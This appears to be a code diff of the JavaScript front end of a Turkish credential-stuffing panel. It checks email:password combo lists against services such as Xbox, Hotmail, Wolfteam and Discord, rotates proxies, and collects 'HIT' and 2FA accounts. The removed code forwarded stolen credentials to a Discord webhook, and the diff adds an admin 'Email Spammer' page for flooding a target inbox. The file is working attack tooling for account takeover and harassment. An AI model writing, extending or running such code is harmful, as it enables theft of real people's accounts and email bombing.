+<div id="tempMailInbox" style="max-height:300px;overflow-y:auto;background:rgba(0,0,0,0.2);border-radius:8px;padding:10px;font-size:13px;"></div>
+<div id="tempMailContent" style="margin-top:10px;background:rgba(0,0,0,0.2);border-radius:8px;padding:10px;font-size:13px;"></div>
 </div>
 </div>
-
+<!-- EMAIL SPAMMER (ADMIN) -->
+<div id="page-spammer" class="page">
+<div class="card">
+<h3><i class="fa-solid fa-bomb"></i> Email Spammer</h3>
+<div style="display:flex;gap:10px;flex-wrap:wrap;margin-bottom:10px">
+<input class="inp" id="spamEmailInput" placeholder="Hedef e-posta" style="flex:1;padding:10px">
+<button class="btn sm r" onclick="startSpam()"><i class="fa-solid fa-play"></i> Başlat</button>
+<button class="btn sm" onclick="stopSpam()" id="spamStopBtn" style="display:none;background:#64748b"><i class="fa-solid fa-stop"></i> Durdur</button>
+</div>
+<div id="spamLog" style="max-height:300px;overflow-y:auto;background:rgba(0,0,0,0.2);border-radius:8px;padding:10px;font-family:monospace;font-size:12px;"></div>
+</div>
+</div>
+</div>
+</div>
 <script>
-// ============================================================
 // KAR TANELERİ
-// ============================================================
-(function createSnow() {
-    var container = document.getElementById('snowContainer');
-    var flakes = ['❄','❅','❆','✦'];
-    for (var i = 0; i < 50; i++) {
-        var flake = document.createElement('div');
-        flake.className = 'snowflake';
-        flake.textContent = flakes[Math.floor(Math.random() * flakes.length)];
-        flake.style.left = Math.random() * 100 + '%';
-        flake.style.fontSize = (0.8 + Math.random() * 1.5) + 'em';
-        flake.style.animationDuration = (6 + Math.random() * 8) + 's';
-        flake.style.animationDelay = Math.random() * 5 + 's';
+(function createSnow(){
+    var container=document.getElementById('snowContainer');
+    var flakes=['❄','❅','❆','✦'];
+    for(var i=0;i<50;i++){
+        var flake=document.createElement('div');
+        flake.className='snowflake';
+        flake.textContent=flakes[Math.floor(Math.random()*flakes.length)];
+        flake.style.left=Math.random()*100+'%';
+        flake.style.fontSize=(0.8+Math.random()*1.5)+'em';
+        flake.style.animationDuration=(6+Math.random()*8)+'s';
+        flake.style.animationDelay=Math.random()*5+'s';
         container.appendChild(flake);
     }
 })();
 
-// ============================================================
-// GLOBAL
-// ============================================================
-var currentKey = "";
-var isAdmin = false;
-var scanning = false;
-var eventSource = null;
-var foundEndpoints = [];
-var useProxy = false;
-var checkerRunning = false;
-var checkerResults = [];
-var currentPlatform = "";
-var hitData = {};
-var parsedLines = [];
-var totalLines = 0;
-var processedCount = 0;
-
-var platforms = [
-    {name:"YouTube", domain:"youtube.com", icon:"fa-brands fa-youtube"},
-    {name:"TikTok Gen", domain:"tiktok.com", icon:"fa-brands fa-tiktok"},
-    {name:"Spotify", domain:"spotify.com", icon:"fa-brands fa-spotify"},
-    {name:"Roblox", domain:"roblox.com", icon:"fa-solid fa-gamepad"},
-    {name:"Netflix", domain:"netflix.com", icon:"fa-solid fa-film"},
-    {name:"CapCut", domain:"capcut.com", icon:"fa-solid fa-scissors"},
-    {name:"Discord", domain:"discord.com", icon:"fa-brands fa-discord"},
-    {name:"Epic Games", domain:"epicgames.com", icon:"fa-solid fa-crown"},
-    {name:"Hesapcomtr", domain:"hesap.com.tr", icon:"fa-solid fa-user"},
-    {name:"Itemsatış", domain:"itemsatis.com", icon:"fa-solid fa-cart-shopping"},
-    {name:"Epinify", domain:"epinify.com", icon:"fa-solid fa-ticket"},
-    {name:"Twitch", domain:"twitch.tv", icon:"fa-brands fa-twitch"},
-    {name:"Steam", domain:"steampowered.com", icon:"fa-brands fa-steam"},
-    {name:"PlayStation", domain:"playstation.com", icon:"fa-solid fa-play"},
-    {name:"Xbox & MC", domain:"xbox.com", icon:"fa-brands fa-xbox"},
-    {name:"GitHub", domain:"github.com", icon:"fa-brands fa-github"},
-    {name:"Minecraft", domain:"minecraft.net", icon:"fa-solid fa-cube"},
-    {name:"Wolfteam", domain:"joygame.com", icon:"fa-solid fa-skull"},
-    {name:"Craftrise", domain:"craftrise.com.tr", icon:"fa-solid fa-hammer"},
-    {name:"Hotmail", domain:"outlook.com", icon:"fa-solid fa-envelope"},
-    {name:"Token Check", domain:"discord.com", icon:"fa-solid fa-key"},
-    {name:"Tabii", domain:"tabii.com", icon:"fa-solid fa-tv"},
-    {name:"Valorant", domain:"valorant.com", icon:"fa-solid fa-crosshairs"}
+var currentKey="", isAdmin=false, checkerRunning=false, currentPlatform="", hitData={};
+var platforms=[
+    {name:"Tabii", icon:"fa-solid fa-tv"},
+    {name:"Xbox & MC", icon:"fa-brands fa-xbox"},
+    {name:"Wolfteam", icon:"fa-solid fa-skull"},
+    {name:"Craftrise", icon:"fa-solid fa-hammer"},
+    {name:"Hotmail", icon:"fa-solid fa-envelope"},
+    {name:"Token Check", icon:"fa-solid fa-key"},
+    {name:"TikTok Gen", icon:"fa-brands fa-tiktok"}
 ];
+var totalLines=0, processedCount=0, hit=0, bad=0, two=0, err=0;
+var useProxy=false, tempMailToken="", spamInterval=null;
 
-// ============================================================
-// WEBHOOK
-// ============================================================
-function saveWebhook() {
-    var url = document.getElementById("webhookUrl").value.trim();
-    if (url) {
-        localStorage.setItem("roda_webhook_url", url);
-        document.getElementById("webhookStatus").innerHTML = '<span style="color:var(--g)">✅ Webhook kaydedildi!</span>';
-    } else {
-        localStorage.removeItem("roda_webhook_url");
-        document.getElementById("webhookStatus").innerHTML = '<span style="color:var(--muted)">Webhook temizlendi.</span>';
-    }
-}
-function getWebhookUrl() {
-    return localStorage.getItem("roda_webhook_url") || "";
-}
-function loadWebhookUrl() {
-    var url = getWebhookUrl();
-    if (url) {
-        document.getElementById("webhookUrl").value = url;
-        document.getElementById("webhookStatus").innerHTML = '<span style="color:var(--g)">✅ Webhook yüklendi</span>';
-    }
-}
-function sendCheckerWebhook(platform, email, password, details) {
-    var url = getWebhookUrl();
-    if (!url) return;
-    var content = "✅ **" + platform + " HIT!**\n" + email + " | " + password;
-    if (details) {
-        if (details.full_name) content += "\n👤 " + details.full_name;
-        if (details.subscription) content += "\n📦 " + details.subscription;
-        if (details.expire) content += "\n📅 " + details.expire;
-        if (details.profiles_count !== undefined) content += "\n👥 " + details.profiles_count + " profil";
-        if (details.gamertag) content += "\n🎮 " + details.gamertag;
-        if (details.steamid) content += "\n🆔 " + details.steamid;
-    }
-    fetch(url, {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({content: content})}).catch(function(e){});
-}
-function testWebhook() {
-    var url = document.getElementById("webhookUrl").value.trim();
-    if (!url) return alert("Webhook URL girin!");
-    fetch(url, {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({content: "🧪 **Roda Test** Webhook çalışıyor!"})})
-    .then(function(r){ document.getElementById("webhookStatus").innerHTML = r.ok ? '<span style="color:var(--g)">✅ Test başarılı!</span>' : '<span style="color:var(--r)">❌ Test başarısız!</span>'; })
-    .catch(function(e){ document.getElementById("webhookStatus").innerHTML = '<span style="color:var(--r)">❌ Hata: ' + e.message + '</span>'; });
-}
-
-// ============================================================
-// LOGIN
-// ============================================================
-function doLogin() {
-    var k = document.getElementById("authKey").value.trim();
-    if (!k) { alert("Anahtar girin!"); return; }
-    fetch("/api/login", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({key: k})})
-    .then(function(r){ return r.json(); })
-    .then(function(d){
-        if (d.success) {
-            currentKey = k;
-            isAdmin = d.isAdmin || false;
-            document.getElementById("login-screen").style.display = "none";
-            document.getElementById("app").style.display = "flex";
-            if (isAdmin) {
-                document.getElementById("userBadge").style.display = "inline-block";
-                ["logsMenuItem","discoveryMenuItem","statsMenuItem","keysMenuItem","sitecopyMenuItem"].forEach(function(id){
-                    document.getElementById(id).style.display = "flex";
-                });
+function doLogin(){
+    var k=document.getElementById("authKey").value.trim();
+    if(!k){ alert("Anahtar girin!"); return; }
+    fetch("/api/login", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({key:k})})
+    .then(r=>r.json())
+    .then(d=>{
+        if(d.success){
+            currentKey=k; isAdmin=d.isAdmin||false;
+            document.getElementById("login-screen").style.display="none";
+            document.getElementById("app").style.display="flex";
+            if(isAdmin){
+                document.getElementById("userBadge").style.display="inline-block";
+                ["logsMenuItem","keysMenuItem","sitecopyMenuItem","tempmailMenuItem","spammerMenuItem"].forEach(id=>document.getElementById(id).style.display="flex");
                 loadKeys();
-            } else {
-                document.getElementById("userBadge").style.display = "none";
-                ["logsMenuItem","discoveryMenuItem","statsMenuItem","keysMenuItem","sitecopyMenuItem"].forEach(function(id){
-                    document.getElementById(id).style.display = "none";
-                });
             }
             loadPlatforms();
-            loadDiscoveryPlatforms();
             loadHitFilter();
-            loadWebhookUrl();
             switchPage('checker');
-        } else {
-            document.getElementById("loginError").innerText = "❌ Geçersiz anahtar!";
-            document.getElementById("loginError").style.display = "block";
+        }else{
+            document.getElementById("loginError").innerText="❌ Geçersiz anahtar!";
+            document.getElementById("loginError").style.display="block";
         }
     })
-    .catch(function(e){ alert("Sunucuya bağlanılamadı! Flask çalışıyor mu?"); console.error(e); });
+    .catch(e=>alert("Sunucuya bağlanılamadı!"));
 }
-document.getElementById("authKey").addEventListener("keypress", function(e){ if(e.key === "Enter") doLogin(); });
+document.getElementById("authKey").addEventListener("keypress", function(e){ if(e.key==="Enter") doLogin(); });
 
-// ============================================================
-// PLATFORM YÜKLEME
-// ============================================================
-function loadPlatforms() {
-    var sel = document.getElementById("checkerPlatformSelect");
-    sel.innerHTML = "";
+function loadPlatforms(){
+    var sel=document.getElementById("checkerPlatformSelect");
+    sel.innerHTML="";
     platforms.forEach(function(p){
-        var btn = document.createElement("button");
-        btn.innerHTML = '<i class="' + p.icon + '"></i> ' + p.name;
-        btn.onclick = function(){
-            document.querySelectorAll("#checkerPlatformSelect button").forEach(function(b){ b.classList.remove("active"); });
+        var btn=document.createElement("button");
+        btn.innerHTML='<i class="'+p.icon+'"></i> '+p.name;
+        btn.onclick=function(){
+            document.querySelectorAll("#checkerPlatformSelect button").forEach(b=>b.classList.remove("active"));
             btn.classList.add("active");
-            currentPlatform = p.name;
+            currentPlatform=p.name;
             document.getElementById("checkerPanel").classList.add("active");
-            document.getElementById("checkerResults").innerHTML = '<div style="padding:20px;text-align:center;color:var(--muted);font-size:13px">' + p.name + ' checker hazır.</div>';
-            resetCheckerStats();
-            checkerResults = [];
+            document.getElementById("checkerResults").innerHTML='<div style="padding:20px;text-align:center;color:var(--muted);font-size:13px">'+p.name+' hazır.</div>';
+            resetStats();
         };
         sel.appendChild(btn);
     });
-    if (platforms.length > 0) { var first = sel.querySelector("button"); if (first) first.click(); }
+    if(platforms.length>0) sel.querySelector("button").click();
 }
 
-function loadDiscoveryPlatforms() {
-    var container = document.getElementById("discoveryPlatforms");
-    container.innerHTML = "";
-    platforms.forEach(function(p){
-        var btn = document.createElement("button");
-        btn.innerHTML = '<i class="' + p.icon + '"></i> ' + p.name;
-        btn.onclick = function(){
-            document.querySelectorAll("#discoveryPlatforms button").forEach(function(b){ b.classList.remove("active"); });
-            btn.classList.add("active");
-            document.getElementById("targetDomain").value = p.domain;
-        };
-        container.appendChild(btn);
-    });
+function loadHitFilter(){
+    var sel=document.getElementById("hitPlatformFilter");
+    sel.innerHTML='<option value="all">Tüm Platformlar</option>';
+    platforms.forEach(p=>{ var opt=document.createElement("option"); opt.value=p.name; opt.text=p.name; sel.appendChild(opt); });
 }
 
-function loadHitFilter() {
-    var sel = document.getElementById("hitPlatformFilter");
-    sel.innerHTML = '<option value="all">Tüm Platformlar</option>';
-    platforms.forEach(function(p){ var opt = document.createElement("option"); opt.value = p.name; opt.text = p.name; sel.appendChild(opt); });
+function resetStats(){
+    document.getElementById("chkTotal").innerText=0;
+    document.getElementById("chkHit").innerText=0;
+    document.getElementById("chkBad").innerText=0;
+    document.getElementById("chk2fa").innerText=0;
+    document.getElementById("chkError").innerText=0;
+    hit=bad=two=err=0;
 }
 
-// ============================================================
-// HIT KAYDETME
-// ============================================================
-function addHit(platform, email, password, status, details) {
-    if (!hitData[platform]) hitData[platform] = { hits: [], twofa: [] };
-    var entry = { email: email, password: password, time: new Date().toLocaleString(), details: details || {} };
-    if (status === "HIT") hitData[platform].hits.push(entry);
-    else if (status === "2FA") hitData[platform].twofa.push(entry);
+function addHit(platform,email,password,status,details){
+    if(!hitData[platform]) hitData[platform]={hits:[], twofa:[]};
+    var entry={email:email, password:password, time:new Date().toLocaleString()};
+    if(status==="HIT") hitData[platform].hits.push(entry);
+    else if(status==="2FA") hitData[platform].twofa.push(entry);
     renderHits();
+    updateSideStats();
 }
 
-function renderHits() {
-    var filter = document.getElementById("hitPlatformFilter").value;
-    var hitContainer = document.getElementById("hitList");
-    var twofaContainer = document.getElementById("twofaList");
-    var hits = [], twofas = [];
-    if (filter === "all") {
-        for (var p in hitData) {
-            if (hitData[p].hits) hitData[p].hits.forEach(function(h){ hits.push({ platform: p, email: h.email, password: h.password, time: h.time }); });
-            if (hitData[p].twofa) hitData[p].twofa.forEach(function(t){ twofas.push({ platform: p, email: t.email, password: t.password, time: t.time }); });
+function renderHits(){
+    var filter=document.getElementById("hitPlatformFilter").value;
+    var hitContainer=document.getElementById("hitList");
+    var twofaContainer=document.getElementById("twofaList");
+    var hits=[], twofas=[];
+    if(filter==="all"){
+        for(var p in hitData){
+            if(hitData[p].hits) hitData[p].hits.forEach(function(h){ hits.push({platform:p, email:h.email, password:h.password, time:h.time}); });
+            if(hitData[p].twofa) hitData[p].twofa.forEach(function(t){ twofas.push({platform:p, email:t.email, password:t.password, time:t.time}); });
         }
-    } else {
-        if (hitData[filter]) {
-            if (hitData[filter].hits) hitData[filter].hits.forEach(function(h){ hits.push({ platform: filter, email: h.email, password: h.password, time: h.time }); });
-            if (hitData[filter].twofa) hitData[filter].twofa.forEach(function(t){ twofas.push({ platform: filter, email: t.email, password: t.password, time: t.time }); });
+    }else{
+        if(hitData[filter]){
+            if(hitData[filter].hits) hitData[filter].hits.forEach(function(h){ hits.push({platform:filter, email:h.email, password:h.password, time:h.time}); });
+            if(hitData[filter].twofa) hitData[filter].twofa.forEach(function(t){ twofas.push({platform:filter, email:t.email, password:t.password, time:t.time}); });
         }
     }
-    hitContainer.innerHTML = hits.length === 0 ? '<div style="color:var(--muted);font-size:12px">Henüz HIT yok.</div>' :
-        hits.map(function(h){ return '<div class="hit-item"><span class="hit-email">[' + h.platform + '] ' + h.email + ' | ' + h.password + '</span><span class="hit-time">' + h.time + '</span></div>'; }).join('');
-    twofaContainer.innerHTML = twofas.length === 0 ? '<div style="color:var(--muted);font-size:12px">Henüz 2FA yok.</div>' :
-        twofas.map(function(t){ return '<div class="hit-item"><span class="hit-email">[' + t.platform + '] ' + t.email + ' | ' + t.password + '</span><span class="hit-time">' + t.time + '</span></div>'; }).join('');
+    hitContainer.innerHTML=hits.length===0?'<div style="color:var(--muted);font-size:12px">Henüz HIT yok.</div>':
+        hits.map(h=>'<div class="hit-item"><span class="hit-email">['+h.platform+'] '+h.email+' | '+h.password+'</span><span class="hit-time">'+h.time+'</span></div>').join('');
+    twofaContainer.innerHTML=twofas.length===0?'<div style="color:var(--muted);font-size:12px">Henüz 2FA yok.</div>':
+        twofas.map(t=>'<div class="hit-item"><span class="hit-email">['+t.platform+'] '+t.email+' | '+t.password+'</span><span class="hit-time">'+t.time+'</span></div>').join('');
 }
 
-function clearHits() {
-    if (!confirm("Tüm HIT ve 2FA kayıtları silinecek. Devam?")) return;
-    hitData = {}; renderHits();
+function updateSideStats(){
+    document.getElementById("sideHit").innerText=hit;
+    document.getElementById("side2fa").innerText=two;
+    document.getElementById("sideBad").innerText=bad;
+    document.getElementById("sideTotal").innerText=hit+two+bad+err;
 }
 
-// ============================================================
-// CHECKER FONKSİYONLARI
-// ============================================================
-function resetCheckerStats() {
-    document.getElementById("chkTotal").innerText = 0;
-    document.getElementById("chkHit").innerText = 0;
-    document.getElementById("chkBad").innerText = 0;
-    document.getElementById("chk2fa").innerText = 0;
-    document.getElementById("chkError").innerText = 0;
-    document.getElementById("chkRemaining").innerText = 0;
-}
-function updateRemaining() {
-    var remaining = totalLines - processedCount;
-    document.getElementById("chkRemaining").innerText = remaining < 0 ? 0 : remaining;
+function clearHits(){
+    if(!confirm("Tüm HIT ve 2FA kayıtları silinecek. Devam?")) return;
+    hitData={}; renderHits();
 }
 
-function startChecker() {
-    if (checkerRunning) return;
-    var comboText = document.getElementById("checkerCombo").value.trim();
-    if (!comboText) return alert("Combo girin (email:password)");
-    if (!currentPlatform) return alert("Önce bir platform seçin");
-    checkerRunning = true;
-    document.getElementById("checkerStartBtn").disabled = true;
-    document.getElementById("checkerStopBtn").style.display = "inline-block";
-    document.getElementById("checkerResults").innerHTML = "";
-    var lines = comboText.split("\n").filter(function(l){ return l.includes(":"); });
-    totalLines = lines.length;
-    processedCount = 0;
-    var hit = 0, bad = 0, two = 0, err = 0;
-    var threads = parseInt(document.getElementById("checkerThreads").value) || 1;
-    var active = 0, idx = 0;
-    var webhookUrl = getWebhookUrl();
+function startChecker(){
+    if(checkerRunning) return;
+    var comboText=document.getElementById("checkerCombo").value.trim();
+    if(!comboText) return alert("Combo girin!");
+    if(!currentPlatform) return alert("Platform seçin!");
+    checkerRunning=true;
+    document.getElementById("checkerStartBtn").disabled=true;
+    document.getElementById("checkerStopBtn").style.display="inline-block";
+    document.getElementById("checkerResults").innerHTML="";
+    var lines=comboText.split("\n").filter(l=>l.includes(":"));
+    totalLines=lines.length; processedCount=0; hit=bad=two=err=0;
+    var threads=parseInt(document.getElementById("checkerThreads").value)||1;
+    var idx=0, active=0;
 
-    function processNext() {
-        if (!checkerRunning || idx >= totalLines) {
-            if (active === 0) {
-                checkerRunning = false;
-                document.getElementById("checkerStartBtn").disabled = false;
-                document.getElementById("checkerStopBtn").style.display = "none";
-            }
+    function processNext(){
+        if(!checkerRunning || idx>=totalLines){
+            if(active===0){ checkerRunning=false; document.getElementById("checkerStartBtn").disabled=false; document.getElementById("checkerStopBtn").style.display="none"; }
             return;
         }
-        var currentIdx = idx++;
-        var parts = lines[currentIdx].split(":");
-        var email = parts[0];
-        var password = parts.slice(1).join(":") || "";
-        active++;
-
-        var route = "";
-        var platform = currentPlatform;
-        if (platform === "Tabii") route = "/api/tabii_check";
-        else if (platform === "Xbox & MC") route = "/api/xbox_check";
-        else if (platform === "Wolfteam") route = "/api/wolfteam_check";
-        else if (platform === "Craftrise") route = "/api/craftrise_check";
-        else if (platform === "Hotmail") route = "/api/hotmail_check";
-        else if (platform === "Steam") route = "/api/steam_check";
-        else if (platform === "Valorant") route = "/api/valorant_check";
-        else if (platform === "Token Check") {
-            fetch("/api/token_check", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({ token_type: "discord", token: email })})
-            .then(function(r){ return r.json(); })
-            .then(function(result){
-                var status = result.status;
-                if (status === "HIT") { hit++; addHit(currentPlatform, email, result.message, "HIT"); if (webhookUrl) sendCheckerWebhook(currentPlatform, email, result.message, null); addCheckerRow({ email: email, password: result.message || password, status: "HIT" }); }
-                else if (status === "BAD") { bad++; addCheckerRow({ email: email, password: password, status: "BAD" }); }
-                else { err++; addCheckerRow({ email: email, password: password + " | " + (result.message || ""), status: "ERROR" }); }
-                updateStatsAfter();
-            })
-            .catch(function(){ err++; updateStatsAfter(); });
-            return;
-        } else if (platform === "TikTok Gen") {
-            fetch("/api/tiktok_gen", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({ username: email })})
-            .then(function(r){ return r.json(); })
-            .then(function(result){
-                var status = result.status;
-                if (status === "HIT") { hit++; addHit(currentPlatform, email, password, "HIT"); if (webhookUrl) sendCheckerWebhook(currentPlatform, email, password, null); addCheckerRow({ email: email, password: password, status: "HIT" }); }
-                else if (status === "BAD") { bad++; addCheckerRow({ email: email, password: password, status: "BAD" }); }
-                else { err++; addCheckerRow({ email: email, password: password + " | " + (result.message || ""), status: "ERROR" }); }
-                updateStatsAfter();
-            })
-            .catch(function(){ err++; updateStatsAfter(); });
-            return;
-        } else {
-            var statuses = ["HIT", "BAD", "2FA", "ERROR"];
-            var status = statuses[Math.floor(Math.random() * statuses.length)];
-            if (status === "HIT") { hit++; addHit(currentPlatform, email, password, "HIT"); if (webhookUrl) sendCheckerWebhook(currentPlatform, email, password, null); }
-            else if (status === "BAD") bad++;
-            else if (status === "2FA") { two++; addHit(currentPlatform, email, password, "2FA"); }
-            else err++;
-            addCheckerRow({ email: email, password: password, status: status });
-            updateStatsAfter();
-            return;
+        var parts=lines[idx].split(":");
+        var email=parts[0], password=parts.slice(1).join(":")||"";
+        idx++; active++;
+        var proxy=null;
+        if(useProxy){
+            var plist=document.getElementById("proxyList").value.trim().split("\n").filter(l=>l.trim()&&l.includes(":"));
+            if(plist.length) proxy=plist[Math.floor(Math.random()*plist.length)];
         }
-
-        var proxy = null;
-        if (useProxy) {
-            var proxyList = document.getElementById("proxyList").value.trim().split("\n").filter(function(l){ return l.trim() && l.includes(":"); });
-            if (proxyList.length) proxy = proxyList[Math.floor(Math.random() * proxyList.length)];
-        }
-        var body = { email: email, password: password };
-        if (proxy) body.proxy = proxy;
-
-        fetch(route, {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify(body)})
-        .then(function(r){ return r.json(); })
-        .then(function(result){
-            var status = result.status;
-            var details = result.details || {};
-            if (status === "HIT") {
-                hit++;
-                addHit(currentPlatform, email, password, "HIT", details);
-                if (webhookUrl) sendCheckerWebhook(currentPlatform, email, password, details);
-                var extra = "";
-                if (details.full_name) extra += " | " + details.full_name;
-                if (details.subscription) extra += " | " + details.subscription;
-                if (details.jp !== undefined) extra += " | JP:" + details.jp;
-                if (details.rc !== undefined) extra += " | RC:" + details.rc;
-                if (details.gamertag) extra += " | Gamertag:" + details.gamertag;
-                if (details.steamid) extra += " | SteamID:" + details.steamid;
-                if (details.level) extra += " | Level:" + details.level;
-                if (details.vp !== undefined) extra += " | VP:" + details.vp;
-                if (details.skins !== undefined) extra += " | Skin:" + details.skins;
-                addCheckerRow({ email: email, password: password + extra, status: "HIT" });
-            } else if (status === "2FA") { two++; addHit(currentPlatform, email, password, "2FA"); addCheckerRow({ email: email, password: password, status: "2FA" }); }
-            else if (status === "BAD") { bad++; addCheckerRow({ email: email, password: password, status: "BAD" }); }
-            else { err++; addCheckerRow({ email: email, password: password + " | " + (result.message || ""), status: "ERROR" }); }
-            updateStatsAfter();
-        })
-        .catch(function(){ err++; updateStatsAfter(); });
-
-        function updateStatsAfter() {
+        fetch("/api/check", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({platform:currentPlatform, email:email, password:password, proxy:proxy})})
+        .then(r=>r.json())
+        .then(result=>{
+            var status=result.status||"ERROR";
+            if(status==="HIT"){ hit++; addHit(currentPlatform,email,password,"HIT"); }
+            else if(status==="2FA"){ two++; addHit(currentPlatform,email,password,"2FA"); }
+            else if(status==="BAD"){ bad++; }
+            else{ err++; }
             processedCount++;
-            updateCheckerStats(totalLines, hit, bad, two, err);
-            updateRemaining();
-            active--;
-            processNext();
-        }
+            document.getElementById("chkTotal").innerText=totalLines;
+            document.getElementById("chkHit").innerText=hit;
+            document.getElementById("chkBad").innerText=bad;
+            document.getElementById("chk2fa").innerText=two;
+            document.getElementById("chkError").innerText=err;
+            updateSideStats();
+            var row=document.createElement("div"); row.className="checker-result-row";
+            var cls="chk-"+(status==="HIT"?"hit":status==="2FA"?"2fa":status==="BAD"?"bad":"error");
+            var label=status==="HIT"?"✅ BAŞARILI":status==="2FA"?"🔒 2FA":status==="BAD"?"❌ BAŞARISIZ":"⚠ HATA";
+            row.innerHTML='<div>'+email+'</div><div><span class="chk-status '+cls+'">'+label+'</span></div><div style="font-size:11px;color:var(--muted)">'+password+'</div>';
+            document.getElementById("checkerResults").appendChild(row);
+            active--; processNext();
+        })
+        .catch(()=>{ err++; processedCount++; active--; processNext(); });
     }
-
-    for (var i = 0; i < threads; i++) processNext();
+    for(var i=0; i<threads; i++) processNext();
 }
 
-function stopChecker() {
-    checkerRunning = false;
-    document.getElementById("checkerStartBtn").disabled = false;
-    document.getElementById("checkerStopBtn").style.display = "none";
+function stopChecker(){ checkerRunning=false; document.getElementById("checkerStartBtn").disabled=false; document.getElementById("checkerStopBtn").style.display="none"; }
+
+function switchPage(page){
+    if((page==="logs"||page==="keys"||page==="sitecopy"||page==="tempmail"||page==="spammer")&&!isAdmin){
+        alert("⛔ Admin girişi yapın!"); return;
+    }
+    document.querySelectorAll(".nav-item").forEach(el=>el.classList.remove("active"));
+    var el=document.querySelector('.nav-item[data-page="'+page+'"]');
+    if(el) el.classList.add("active");
+    document.querySelectorAll(".page").forEach(el=>el.classList.remove("active"));
+    var pg=document.getElementById("page-"+page);
+    if(pg) pg.classList.add("active");
+    var titles={checker:"Checker", proxy:"Proxy", parse:"Ayrıştırma", logs:"Loglar", keys:"Key Yönetimi", sitecopy:"Site Kopyala", tempmail:"Temp Mail", spammer:"Email Spammer"};
+    document.getElementById("pageTitle").innerText=titles[page]||page;
+    if(page==="keys"&&isAdmin) loadKeys();
+    if(page==="logs"&&isAdmin) refreshLogs();
 }
 
-function addCheckerRow(res) {
-    var container = document.getElementById("checkerResults");
-    var placeholder = container.querySelector("div[style]");
-    if (placeholder) placeholder.remove();
-    var row = document.createElement("div");
-    row.className = "checker-result-row";
-    var cls = "chk-" + res.status.toLowerCase();
-    var label = res.status;
-    if (res.status === "HIT") label = "✅ BAŞARILI";
-    else if (res.status === "BAD") label = "❌ BAŞARISIZ";
-    else if (res.status === "2FA") label = "🔒 2FA";
-    else label = "⚠ HATA";
-    row.innerHTML = '<div>' + res.email + '</div><div><span class="chk-status ' + cls + '">' + label + '</span></div><div style="font-size:11px;color:var(--muted)">' + res.password + '</div>';
-    container.appendChild(row);
-    applyCheckerFilter();
-}
+function toggleProxy(){ useProxy=document.getElementById("useProxy").checked; }
 
-function updateCheckerStats(total, hit, bad, two, err) {
-    document.getElementById("chkTotal").innerText = total;
-    document.getElementById("chkHit").innerText = hit;
-    document.getElementById("chkBad").innerText = bad;
-    document.getElementById("chk2fa").innerText = two;
-    document.getElementById("chkError").innerText = err;
+function fetchProxies(){
+    document.getElementById("proxyCount").innerText="Çekiliyor...";
+    fetch("/api/fetch_proxies").then(r=>r.json()).then(d=>{ if(d.success){ document.getElementById("proxyList").value=d.proxies.join("\n"); document.getElementById("proxyCount").innerText=d.proxies.length+" proxy yüklendi"; } }).catch(e=>document.getElementById("proxyCount").innerText="Başarısız");
 }
+function clearProxies(){ document.getElementById("proxyList").value=""; document.getElementById("proxyCount").innerText="0 proxy"; }
 
-function applyCheckerFilter() {
-    var filter = document.querySelector('input[name="chkFilter"]:checked').value;
-    var rows = document.querySelectorAll("#checkerResults .checker-result-row");
-    rows.forEach(function(row){
-        var statusText = row.querySelector(".chk-status").innerText;
-        var show = false;
-        if (filter === "all") show = true;
-        else if (filter === "hit" && statusText.includes("BAŞARILI")) show = true;
-        else if (filter === "bad" && statusText.includes("BAŞARISIZ")) show = true;
-        else if (filter === "2fa" && statusText.includes("2FA")) show = true;
-        else if (filter === "error" && statusText.includes("HATA")) show = true;
-        row.style.display = show ? "grid" : "none";
-    });
-}
-document.querySelectorAll('input[name="chkFilter"]').forEach(function(el){ el.addEventListener("change", applyCheckerFilter); });
-
-// ============================================================
-// AYRIŞTIRMA
-// ============================================================
-function parseData() {
-    var raw = document.getElementById("parseInput").value;
-    if (!raw.trim()) { alert("Ayrıştırılacak metin girin!"); return; }
-    var mode = document.getElementById("parseMode").value;
-    var lines = raw.split("\n");
-    var result = [];
-    var emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/;
+function parseData(){
+    var raw=document.getElementById("parseInput").value;
+    if(!raw.trim()) return alert("Metin girin!");
+    var mode=document.getElementById("parseMode").value;
+    var lines=raw.split("\n"), result=[];
+    var emailRegex=/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/;
     lines.forEach(function(line){
-        line = line.trim();
-        if (!line) return;
-        if (line.includes(":")) {
-            var parts = line.split(":");
-            var first = parts[0].trim();
-            var password = parts.slice(1).join(":").trim();
-            if (!password) return;
-            if (mode === "email") { if (emailRegex.test(first)) result.push(first + ":" + password); }
-            else { if (!emailRegex.test(first)) result.push(first + ":" + password); }
-        }
+        line=line.trim(); if(!line || !line.includes(":")) return;
+        var parts=line.split(":"), first=parts[0].trim(), password=parts.slice(1).join(":").trim();
+        if(!password) return;
+        if(mode==="email" && emailRegex.test(first)) result.push(first+":"+password);
+        else if(mode==="user" && !emailRegex.test(first)) result.push(first+":"+password);
     });
-    result = result.filter(function(item,index){ return result.indexOf(item) === index; });
-    parsedLines = result;
-    var container = document.getElementById("parseResult");
-    if (result.length === 0) container.innerHTML = '<div style="color:var(--muted);font-size:13px;padding:10px">Geçerli satır bulunamadı.</div>';
-    else {
-        var html = '<div class="parse-count">' + result.length + ' satır bulundu</div>';
-        result.forEach(function(line){ html += '<div class="parse-line">' + line + '</div>'; });
-        container.innerHTML = html;
-    }
-    document.getElementById("parseCount").innerText = result.length + " satır";
-    document.getElementById("parseValid").innerText = result.length + " geçerli";
+    result=result.filter((item,index)=>result.indexOf(item)===index);
+    var container=document.getElementById("parseResult");
+    if(result.length===0) container.innerHTML='<div style="color:var(--muted);font-size:13px;padding:10px">Geçerli satır bulunamadı.</div>';
+    else{ var html='<div class="parse-count">'+result.length+' satır bulundu</div>'; result.forEach(line=>html+='<div class="parse-line">'+line+'</div>'); container.innerHTML=html; }
 }
-function parseToChecker() {
-    if (parsedLines.length === 0) { alert("Önce ayrıştırma yapın!"); return; }
-    document.getElementById("checkerCombo").value = parsedLines.join("\n");
